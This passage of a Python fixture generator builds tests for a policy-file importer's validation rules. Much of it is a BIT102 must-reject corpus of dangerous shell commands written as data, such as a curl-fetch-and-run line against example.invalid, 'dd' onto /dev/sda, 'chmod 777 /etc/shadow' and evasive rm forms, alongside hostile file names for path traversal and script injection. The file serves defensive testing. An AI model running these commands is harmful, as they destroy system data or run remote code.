content("BIT005", "duplicate-id", "duplicate id, reported on plugin 2", t, "<PluginId>",
        f"{P2}/PluginId", nth=2)
for name, val in [("empty", ""), ("whitespace", " \n\t  \n ")]:
    fx = f"content/bit008-{name}"
    t = build(fx, f"Execute {name}", plugins=[plugin(fx, 1, execute=val)])
    content("BIT008", name, f"Execute {name} after trimming", t, "<Execute", f"{P1}/Execute")
fx = "content/bit008-too-long"
t = build(fx, "Execute of 16,385 characters (multi-byte)", plugins=[
    plugin(fx, 1, execute="echo " + "é" * 16380)])
content("BIT008", "too-long", "16,385 characters", t, "<Execute", f"{P1}/Execute")
fx = "content/bit008-at-limit"
t = build(fx, "Execute of exactly 16,384 characters (multi-byte) is accepted", plugins=[
    plugin(fx, 1, execute="echo " + "é" * 16379)])
emit(f"{fx}.bit", t, [], "16,384 characters accepted")
for name, val in [("unknown", "equal"), ("empty", ""), ("spaced", "not equals")]:
    fx = f"content/bit010-{name}"
    t = build(fx, f"Operator {val!r}", plugins=[plugin(fx, 1, operator=val)])
    content("BIT010", name, f"Operator {val!r}", t, "<Operator>", f"{P1}/Operator")
fx = "content/bit010-missing"
t = build(fx, "Operator missing in plugin 2 (#2): BIT010, not BIT002",
          plugins=[plugin(fx, 1), plugin(fx, 2, operator=None)])
emit(f"{fx}.bit", t, ["BIT010"], "missing Operator in plugin 2 (#2)",
     lines=[line_of(t, "<Plugin>", 2), line_of(t, "<ExpectedResult>", 2)],
     element_prefix=P2)
fx = "content/bit011-missing"
t = build(fx, "ExpectedResult missing in plugin 1 (#2): BIT011, not BIT002",
          plugins=[plugin(fx, 1, expected=None)])
emit(f"{fx}.bit", t, ["BIT011"], "missing ExpectedResult (#2)",
     lines=[line_of(t, "<Plugin>"), line_of(t, "</Plugin>")], element_prefix=P1)
fx = "content/missing-operator-plus-faults"
t = build(fx, "missing Operator in plugin 2 plus a BIT004 in plugin 1: both reported (REQ-151 (4))",
          plugins=[plugin(fx, 1, id="NOT-A-UUID"), plugin(fx, 2, operator=None)])
emit(f"{fx}.bit", t, ["BIT004", "BIT010"], "content rules still run with a missing Operator")
for op in ["eq", "ne", "gt", "ge", "lt", "le"]:
    fx = f"content/bit012-{op}"
    t = build(fx, f"{op} with non-numeric abc", plugins=[plugin(fx, 1, operator=op, expected="abc")])
    content("BIT012", op, f"{op} abc", t, "<ExpectedResult>", f"{P1}/ExpectedResult")
for name, op, val in [("lookahead", "regex", "(?=x)"), ("backref", "regex", "(a)\\1"),
                      ("bracket", "not_regex", "["), ("lookbehind", "not_regex", "(?&lt;!a)b")]:
    fx = f"content/bit013-{name}"
    t = build(fx, f"{op} with RE2-invalid {name}", plugins=[plugin(fx, 1, operator=op, expected=val)])
    content("BIT013", name, f"{op} {val}", t, "<ExpectedResult>", f"{P1}/ExpectedResult")
for name, op, val in [("empty-with-value", "empty", "x"), ("not-empty-with-value", "not_empty", "x"),
                      ("equals-empty", "equals", ""), ("regex-whitespace", "regex", "  \t ")]:
    fx = f"content/bit014-{name}"
    t = build(fx, f"{op} with {val!r}", plugins=[plugin(fx, 1, operator=op, expected=val)])
    content("BIT014", name, f"{op} {val!r}", t, "<ExpectedResult>", f"{P1}/ExpectedResult")
for name, val in [("1.1", "1.1"), ("1.00", "1.00"), ("empty", ""), ("2.0", "2.0")]:
    fx = f"content/bit016-{name}"
    t = build(fx, f"formatVersion {val!r}", root_attrs=f' formatVersion="{val}"')
    content("BIT016", name, f"formatVersion {val!r}", t, "<Policy ", "Policy/@formatVersion")
for name, val in [("0", "0"), ("601", "601"), ("30s", "30s"), ("1.5", "1.5"), ("minus1", "-1"),
                  ("plus5", "+5"), ("space30", " 30"), ("empty", ""), ("arabic", "٣٠")]:
    fx = f"content/bit017-timeout-{name}"
    t = build(fx, f"timeout {val!r} (#105 (e))", plugins=[plugin(fx, 1, timeout=val)])
    content("BIT017", f"timeout-{name}", f"timeout {val!r}", t, "<Execute",
            f"{P1}/Execute/@timeout")
LIM = [
    ("policyname", "PolicyName", 128, "Policy/PolicyName", "<PolicyName>"),
    ("policydescription", "PolicyDescription", 4000, "Policy/PolicyDescription",
     "<PolicyDescription>"),
    ("familyname", "FamilyName", 128, "Policy/Family/FamilyName", "<FamilyName>"),
    ("pluginname", "PluginName", 255, f"{P1}/PluginName", "<PluginName>"),
    ("plugindescription", "PluginDescription", 4000, f"{P1}/PluginDescription",
     "<PluginDescription>"),
    ("expectedresult", "ExpectedResult", 4000, f"{P1}/ExpectedResult", "<ExpectedResult>"),
]
for key, el, n, path, needle in LIM:
    for over in (False, True):
        size = n + 1 if over else n
        fx = f"content/bit017-{key}-{'over' if over else 'at'}-limit"
        if el in ("PluginName",):
            val = "1.1 - " + "é" * (size - 6)
        else:
            val = "é" * size
        kw: dict = {}
        pl = None
        if el == "PolicyName":
            kw["name"] = val
        elif el == "PolicyDescription":
            kw["desc"] = val
        elif el == "FamilyName":
            kw["family"] = val
        elif el == "PluginName":
            pl = [plugin(fx, 1, name=val)]
        elif el == "PluginDescription":
            pl = [plugin(fx, 1, desc=val)]
        else:
            pl = [plugin(fx, 1, operator="contains", expected=val)]
        t = build(fx, f"{el} of {size} characters (2-byte each)", plugins=pl, **kw)
        if over:
            content("BIT017", f"{key}-over-limit", f"{el} {size} chars", t, needle, path)
        else:
            emit(f"{fx}.bit", t, [], f"{el} at its limit ({n} characters) is accepted")
for key, el, path, needle in [
    ("policyname", "PolicyName", "Policy/PolicyName", "<PolicyName>"),
    ("familyname", "FamilyName", "Policy/Family/FamilyName", "<FamilyName>"),
    ("pluginname", "PluginName", f"{P1}/PluginName", "<PluginName>"),
]:
    fx = f"content/bit017-{key}-whitespace"
    kw = {}
    pl = None
    if el == "PolicyName":
        kw["name"] = " \t "
    elif el == "FamilyName":
        kw["family"] = "  "
    else:
        pl = [plugin(fx, 1, name="   ")]
    t = build(fx, f"{el} whitespace only counts as empty (#17)", plugins=pl, **kw)
    extra = ["BIT101"] if el == "PluginName" else None
    content("BIT017", f"{key}-whitespace", f"{el} empty after trimming", t, needle, path,
            extra_codes=extra)
fx = "content/bit101-no-control-ref"
t = build(fx, "PluginName without a leading control reference (Warn)", plugins=[
    plugin(fx, 1, name="Ensure AppArmor is installed")])
emit(f"{fx}.bit", t, ["BIT101"], "warning only: success", lines=[line_of(t, "<PluginName>")],
     element=f"{P1}/PluginName", outcome="success")
fx = "content/bit101-arabic-digits"
t = build(fx, "Arabic-Indic digits are not a control reference (REQ-154 (1))", plugins=[
    plugin(fx, 1, name="١.٣ - Ensure")])
emit(f"{fx}.bit", t, ["BIT101"], "warning only: success", lines=[line_of(t, "<PluginName>")],
     element=f"{P1}/PluginName", outcome="success")
fx = "content/bit103-long-control-ref"
t = build(fx, "33-character control reference (Warn)", plugins=[
    plugin(fx, 1, name="1." * 16 + "1 - Long reference")])
emit(f"{fx}.bit", t, ["BIT103"], "warning only: success", lines=[line_of(t, "<PluginName>")],
     element=f"{P1}/PluginName", outcome="success")
for name, cmd in [
    ("rm", "rm -f /etc/issue.net"),
    ("redirect", "echo pwned > /etc/motd"),
    ("systemctl-stop", "systemctl stop ssh"),
    ("sed-i", "sed -i 's/a/b/' /etc/hosts"),
    ("bash-c-subst", 'bash -c "$(curl -s http://example.invalid/x)"'),
    ("unlexable", 'echo "unterminated'),
]:
    fx = f"content/bit102-{name}"
    t = build(fx, f"BIT102: {cmd}", plugins=[plugin(fx, 1, execute=cmd)])
    content("BIT102", name, f"write-like or code-running: {cmd}", t, "<Execute", f"{P1}/Execute")
fx = "content/three-faults"
t = build(fx, "three content faults on three lines: BIT003, BIT004, BIT012 (in line order)",
          status="on", plugins=[plugin(fx, 1, id="BAD"), plugin(fx, 2, operator="eq", expected="x")])
emit(f"{fx}.bit", t, ["BIT003", "BIT004", "BIT012"], "all three reported, ordered by line",
     lines=[line_of(t, "<PolicyStatus>"), line_of(t, "<PluginId>"),
            line_of(t, "<ExpectedResult>", 2)])
fx = "content/warning-with-error"
t = build(fx, "a rejected file lists its warnings too (REQ-154 (3))",
          plugins=[plugin(fx, 1, name="Ensure x"), plugin(fx, 2, operator="equal")])
emit(f"{fx}.bit", t, ["BIT101", "BIT010"], "rejected with the warning listed")

# ---------------------------------------------------------------- catalog-state pairs
fx = "db/bit007-a"
emit(f"{fx}.bit", build(fx, "server-folder file a; same PolicyName as bit007-b",
                        name="Fixture BIT007 shared name"), [], "BIT007 pair, first")
fx = "db/bit007-b"
emit(f"{fx}.bit", build(fx, "server-folder file b; same PolicyName as bit007-a",
                        name="Fixture BIT007 shared name"), ["BIT007"],
     "BIT007 when a.bit exists in the server folder", element="Policy/PolicyName")
shared = uid("db/bit015-shared")
fx = "db/bit015-owner"
emit(f"{fx}.bit", build(fx, "owns the shared plugin id", plugins=[plugin(fx, 1, id=shared)]), [],
     "BIT015 pair, owner")
fx = "db/bit015-claimer"
emit(f"{fx}.bit", build(fx, "lists the owner's plugin id", plugins=[
    plugin(fx, 1), plugin(fx, 2, id=shared)]), ["BIT015"],
     "BIT015 while the owner is not deleted and still lists it", element=f"{P2}/PluginId")
fx = "db/bit015-owner-dropped"
emit(f"{fx}.bit", build(fx, "the owner (same PolicyName) no longer lists the shared id",
                        name="Fixture db/bit015-owner"), [],
     "re-import of the owner without the shared id")

# ---------------------------------------------------------------- BIT102 corpora
WORDS = ["rm", "mv", "cp", "tee", "dd", "chmod", "chown", "chgrp", "truncate", "ln",
         "install", "mkfs", "mount", "umount"]
ARGS = {"rm": "-f /etc/x", "mv": "/etc/a /etc/b", "cp": "/etc/a /etc/b", "tee": "/etc/x",
        "dd": "if=/dev/zero of=/dev/sda", "chmod": "777 /etc/shadow", "chown": "root /etc/x",
        "chgrp": "root /etc/x", "truncate": "-s 0 /etc/x", "ln": "-s /a /b",
        "install": "-m 755 a /usr/bin/a", "mkfs": "/dev/sdb", "mount": "/dev/sdb /mnt",
        "umount": "/mnt"}
reject: list[dict] = []
for w in WORDS:
    reject.append({"cmd": f"{w} {ARGS[w]}", "token": w, "rule": "command word", "contexts": True})
for opt in ["-i", "--in-place", "-ni", "-i.bak", "--in-place=.b", "-e s/a/b/ -i"]:
    reject.append({"cmd": f"sed {opt} 's/a/b/' /etc/hosts" if "s/a" not in opt
                   else f"sed {opt} /etc/hosts", "token": "sed", "rule": "sed -i",
                   "contexts": opt == "-i"})
for verb in ["install", "remove", "purge", "upgrade", "full-upgrade", "dist-upgrade", "autoremove"]:
    for tool in ["apt", "apt-get"]:
        reject.append({"cmd": f"{tool} {verb} -y openssh-server" if verb not in
                       ("upgrade", "full-upgrade", "dist-upgrade", "autoremove") else f"{tool} {verb} -y",
                       "token": verb, "rule": f"{tool} verb", "contexts": tool == "apt-get" and verb == "install"})
reject.append({"cmd": "apt-get -y install x", "token": "install", "rule": "apt-get verb after option (#108 (g))"})
reject.append({"cmd": "apt-get -s upgrade", "token": "upgrade", "rule": "verb is first non-option word (#108 (g))"})
for opt in ["-i x.deb", "-r x", "-P x", "--install x.deb", "--remove x", "--purge x",
            "--configure -a", "--purge=x", "--remove=x"]:
    reject.append({"cmd": f"dpkg {opt}", "token": opt.split()[0].split("=")[0], "rule": "dpkg option",
                   "contexts": opt == "-i x.deb"})
for verb in ["start", "stop", "restart", "reload", "enable", "disable", "mask", "unmask",
             "kill", "isolate", "set-property"]:
    reject.append({"cmd": f"systemctl {verb} ssh", "token": verb, "rule": "systemctl verb",
                   "contexts": verb == "stop"})
reject.append({"cmd": "systemctl --now enable ssh", "token": "enable", "rule": "systemctl verb after option"})
for cmd in ["echo x > /etc/x", "echo x >> /etc/x", "echo x >| /etc/x", "echo x 2> /etc/x",
            "echo x >/tmp/../etc/x", 'echo x > "$F"', "echo x > $HOME/x", "echo x > /tmpx",
            "echo x &> /var/x", "echo x >& /var/x", "echo x > /tmp", "echo x > ./x",
            "echo x 1>/etc/x", "echo x > /dev/sda", "echo x > /tmp/$(id -u)"]:
    reject.append({"cmd": cmd, "token": ">", "rule": "output redirection (#108 (i))",
                   "contexts": cmd == "echo x > /etc/x"})
for cmd, tok in [(". /etc/profile", "."), ("source /etc/profile", "source"),
                 ("eval echo x", "eval"), ("exec cat /etc/x", "exec"),
                 ("find / -name x -print | xargs cat", "xargs"), ("xargs -0 cat", "xargs"),
                 ("find / -name x -exec cat {} \\;", "-exec"), ("find / -execdir cat {} +", "-execdir"),
                 ("find / -ok cat {} \\;", "-ok"), ("find / -okdir cat {} \\;", "-okdir"),
                 ("sh ./x.sh", "sh"), ("bash /tmp/x", "bash"), ("dash x.sh", "dash"),
                 ("sh -s", "sh"), ("echo id | sh", "sh"), ("bash", "bash"), ("sh < /tmp/x", "sh"),
                 ("bash -x /tmp/x", "bash"),
                 ('bash -c "$(curl x)"', "$("), ("sh -c '`id`'", "`"),
                 ("dash -c 'cat <(id)'", "<("), ("bash -c 'echo $(id)'", "$(")]:
    reject.append({"cmd": cmd, "token": tok, "rule": "running other code",
                   "contexts": cmd in (". /etc/profile", "eval echo x", "xargs -0 cat",
                                       "find / -name x -exec cat {} \\;", "sh ./x.sh")})
for cmd in ["/bin/rm -f /etc/x", "/usr/bin/rm -f /etc/x", "./rm x", "mkfs.ext4 /dev/sdb",
            "mkfs.xfs /dev/sdb", "env rm x", "env -i rm x", "env FOO=1 rm x", "env -i FOO=1 rm x",
            "busybox rm x", "sudo rm x", "doas rm x", "command rm x", "builtin eval x",
            "nice rm x", "nohup rm x", "setsid rm x", "timeout 5 rm x", "chroot / rm x",
            "FOO=1 rm x", "A=1 B=2 rm x", "r''m x", "\\rm x", '"rm" x', "'rm' x",
            "/usr/bin/env rm x", "sudo /bin/rm x", "/sbin/mkfs.ext4 /dev/sdb"]:
    reject.append({"cmd": cmd, "token": "rm" if "rm" in cmd else cmd.split()[0].split("/")[-1],
                   "rule": "#108 (a)-(e) matching"})
# nesting forms called out by REQ-157 (1) explicitly
for cmd in ["true | rm x", "true; rm x", "true && rm x", "false || rm x", "(rm x)", "{ rm x; }",
            "echo $(rm x)", "echo `rm x`", "cat <(rm x)", "bash -c 'rm x'", "sh -c 'true; rm x'",
            "if true; then rm x; fi", "while false; do rm x; done", "for f in a; do rm $f; done",
            "case a in a) rm x;; esac", "f() { rm x; }; f", "true & rm x", "echo $(echo $(rm x))",
            "bash -c 'bash -c \"rm x\"'", "x=$(rm y)", "cat >(rm x)", "until true; do rm x; done",
            "! rm x", "time rm x"]:
    reject.append({"cmd": cmd, "token": "rm", "rule": "every simple command (#108 (c))"})
reject.append({"cmd": "cat <<EOF\n$(rm -f /etc/x)\nEOF", "token": "rm",
               "rule": "unquoted here-document substitution (#108 (h))"})
reject.append({"cmd": "cat <<EOF\n`rm -f /etc/x`\nEOF", "token": "rm",
               "rule": "unquoted here-document backtick (#108 (h))"})
reject.append({"cmd": "cat <<-EOF\n\t$(rm x)\n\tEOF", "token": "rm", "rule": "<<- here-document"})

passing = [
    "dpkg-query -W -f='${Status}' apparmor 2>/dev/null",
    "apt-cache policy apparmor",
    "apt list --installed 2>/dev/null",
    "find / -xdev -perm -4000 -print 2>/dev/null",
    "systemctl is-enabled ssh",
    "command -v apparmor_parser",
    "grep -E '^\\s*PermitRootLogin' /etc/ssh/sshd_config",
    'echo "rm"',
    "printf '%s\\n' mount",
    "findmnt --task 1 -no OPTIONS /tmp",
    "cat <<'EOF'\nrm -rf /\n$(rm -rf /)\nEOF",
    "cat <<\"EOF\"\nmount /dev/sda /mnt\nEOF",
    "ls /nonexistent 2>&1",
    "echo x >/tmp/out",
    "find /etc/ssh -name 'ssh_host_*_key' -print | while read -r f; do stat -c %a \"$f\"; done",
    # at least 40 more common CIS audit commands (read-only)
    "stat -Lc '%n %a %u/%U %g/%G' /etc/passwd",
    "grep -Psi '^\\h*PASS_MAX_DAYS\\h+\\d+' /etc/login.defs",
    "awk -F: '($2 == \"\") {print $1}' /etc/shadow",
    "sshd -T 2>/dev/null | grep -i '^permitrootlogin'",
    "modprobe -n -v cramfs 2>&1",
    "lsmod | grep -c cramfs",
    "findmnt --task 1 -kn /dev/shm",
    "awk '$2 == \"/tmp\" {print $4}' /proc/1/mountinfo",
    "systemctl is-active auditd",
    "systemctl list-unit-files --type=service --no-pager",
    "systemctl list-units --type=service --state=running --no-pager",
    "systemctl show -p ActiveState --value ssh",
    "systemctl status ssh --no-pager 2>/dev/null | head -n 3",
    "dpkg -s aide 2>/dev/null | grep -E '^Status'",
    "dpkg -l | grep -c '^ii'",
    "dpkg --status apparmor 2>/dev/null",
    "dpkg-query -W -f='${binary:Package}\\t${Status}\\n' nftables",
    "sysctl -n net.ipv4.ip_forward",
    "cat /proc/sys/kernel/randomize_va_space",
    "nft list ruleset 2>/dev/null | head -n 1",
    "bitscan-capread nft_ruleset",
    "bitscan-capread audit_rules",
    "test -f /etc/issue.net && cat /etc/issue.net",
    "[ -e /etc/motd ] && stat -c %a /etc/motd",
    "ls -l /etc/cron.d",
    "id -u nobody",
    "getent passwd root | cut -d: -f7",
    "awk -F: '$3 == 0 {print $1}' /etc/passwd",
    "grep -c '^+:' /etc/passwd || true",
    "for f in /etc/ssh/ssh_host_*_key; do stat -c '%a %U' \"$f\"; done",
    "if [ -d /etc/sudoers.d ]; then grep -rh '^Defaults' /etc/sudoers /etc/sudoers.d; fi",
    "case \"$(uname -m)\" in x86_64) echo ok;; *) echo other;; esac",
    "printf '%s\\n' \"$(id -u)\"",
    "echo \"$(( 1 + 2 ))\"",
    "ps -eo comm | grep -c '^sshd$'",
    "timedatectl show -p NTP --value",
    "chronyc tracking 2>/dev/null | head -n 1",
    "ss -lntu",
    "ip -j addr",
    "who | wc -l",
    "readlink -f /etc/localtime",
    "stat -c %a /boot/grub/grub.cfg",
    "grep -E '^\\s*kernel.randomize_va_space' /etc/sysctl.conf /etc/sysctl.d/*.conf",
    "sed -n '/^Port/p' /etc/ssh/sshd_config",
    "sed -e 's/a/b/' /etc/hostname",
    "awk '/^\\s*UMASK/{print $2}' /etc/login.defs",
    "find /var/log -type f -perm /g+wx,o+rwx -print 2>/dev/null",
    "find / -xdev -nouser -print 2>/dev/null | head -n 5",
    "find /etc -maxdepth 1 -name 'issue*' -print",
    "wc -l < /etc/passwd",
    "grep ^VERSION_ID= /etc/os-release",
    "uname -r",
    "grep -q '^install cramfs /bin/true' /etc/modprobe.d/*.conf && echo yes || echo no",
    "apt list --installed 2>/dev/null | grep -c openssh-server",
    "systemctl is-enabled ssh 2>&1",
    "echo x 2>&1 >/dev/null",
    "ls /etc >> /tmp/list.txt",
    "echo rm",
    "grep -E 'rm|mv|cp' /etc/aliases",
    "echo 'systemctl stop ssh'",
    "apt -qq list --upgradable 2>/dev/null",
    "apt-cache show apparmor",
    "journalctl --disk-usage 2>/dev/null",
    "auditctl -l 2>/dev/null",
    "ufw status verbose 2>/dev/null",
    "awk -F: '($3>=1000)&&($7 !~ /nologin/){print $1}' /etc/passwd",
    "grep -h 'pam_pwquality' /etc/pam.d/common-password",
    "passwd -S root 2>/dev/null",
    "echo x >/dev/stdout",
    "echo x >/dev/stderr",
    "echo x >&2",
    "cat /etc/hosts 2>/dev/null >/dev/null",
    "f=/etc/passwd; stat -c %a \"$f\"",
    "systemctl list-units --all --no-pager | grep -c '\\.mount'",
    "grep -l rm /etc/profile.d/*.sh",
    "find /home -maxdepth 1 -type d -perm /o+w -print",
    # User ruling 2026-10-27 (via main): a non-literal command word is not
    # matched against the SR §4.2 lists (BIT102 is a safety net; the sandbox is
    # the control), so these pass.
    '"$c" x',
    "${x} y",
    "$(echo rm) x",
    "$'\\x72m' x",
    'sh -c "$s"',
]

(OUT / "bit102").mkdir(parents=True, exist_ok=True)
(OUT / "bit102" / "must_reject.json").write_text(
    json.dumps({"note": "SR §4.2 and #108: each cmd must get BIT102 with token in the message; "
                        "contexts=true also wraps it in every REQ-157 (1) context",
                "cases": reject}, indent=1, ensure_ascii=False) + "\n", encoding="utf-8")
(OUT / "bit102" / "must_pass.json").write_text(
    json.dumps({"note": "SR §4.2 read-only uses, REQ-157 (2) list and common CIS audit commands; "
                        "none may get BIT102 (the SR §1.1 Execute is first)",
                "cases": passing}, indent=1, ensure_ascii=False) + "\n", encoding="utf-8")

hostile = {
    "note": "REQ-163 (1) client file names; 'hex' entries are raw bytes of the part header filename",
    "names": ["../../etc/passwd", "/abs.bit", "a/b.bit", "..", "x" * 5000, "a\x00b.bit",
              "a\rb.bit", "a\nb.bit", "<script>alert(1)</script>.bit", "evil\u202etib.exe",
              "C:\\Windows\\x.bit", "con.bit", ".tmp-1-" + "0" * 64, "policy-1.bit", "",
              "  .bit", "\u0007bell.bit", "\x7fdel.bit", "é" * 300],
    "hex": ["ff fe 2e 62 69 74", "c3 28 2e 62 69 74", "ed a0 80 2e 62 69 74"],
}
(OUT / "hostile_names.json").write_text(json.dumps(hostile, indent=1, ensure_ascii=True) + "\n",
                                        encoding="utf-8")

(OUT / "manifest.json").write_text(
    json.dumps({
        "note": "bits/tests fixtures (tester-owned, REQ-180). codes: every code the importer must "
                "report (exactly this set); lines: allowed start-tag lines of the first finding of "
                "the first code (or of each code in order for multi-code files); element / "
                "element_prefix: the #105 (g) path; placeholders are replaced by the test "
                "(@@CANARY@@ an absolute path, @@PORT@@ a local listener port). Oversize (5 MiB + 1) "
                "and 5,000/5,001-plugin files are generated at test time.",
        "fixtures": MANIFEST,
    }, indent=1, ensure_ascii=False) + "\n", encoding="utf-8")
print(len(MANIFEST), "fixtures;", len(reject), "reject;", len(passing), "pass")
